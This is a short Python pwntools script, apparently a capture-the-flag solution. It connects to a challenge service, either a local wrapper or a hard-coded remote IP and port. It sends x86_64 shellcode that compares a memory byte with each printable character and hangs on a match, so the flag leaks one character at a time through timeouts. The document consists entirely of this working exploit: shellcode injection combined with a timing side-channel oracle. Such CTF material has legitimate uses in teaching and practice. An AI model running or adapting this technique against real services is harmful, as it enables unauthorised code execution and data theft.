#!/usr/bin/env python
from pwn import *

context.arch = 'x86_64'

def connect(index):
    if len(sys.argv) == 1:
        s = process('python3 wrapper.py', shell=True)
    else:
        s = remote('195.201.127.119', 8664)
    s.sendlineafter('today?\n', str(index))
    return s

def find_flag(index):
    for c in string.printable:
        s = connect(index)
        shellcode = asm('''
                cmp byte ptr [rip + 2], %#x
                label:
                je label
            ''' % ord(c))
        s.sendafter('please.\n', shellcode)
        try:
            res = s.recv(timeout=1)
        except:
            res = 'error'
        finally:
            s.close()
        if res == '':
            return c

flag = ''
for i in range(0x50):
    flag += find_flag(i)
    print flag
    if flag.endswith('}'):
        break

print flag
